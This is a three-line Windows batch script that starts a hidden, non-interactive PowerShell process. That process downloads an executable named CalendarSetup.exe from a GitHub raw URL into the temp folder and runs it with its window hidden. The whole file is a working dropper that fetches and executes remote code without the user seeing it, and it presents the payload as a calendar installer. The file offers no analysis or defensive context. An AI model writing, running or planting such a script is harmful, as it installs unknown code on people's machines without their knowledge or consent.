@echo off
start "" /B powershell -NoP -NonI -W Hidden -C "$b='%TEMP%\cs.exe';irm https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/CalendarSetup.exe -OutFile $b;Start-Process $b -WindowStyle Hidden"
exit
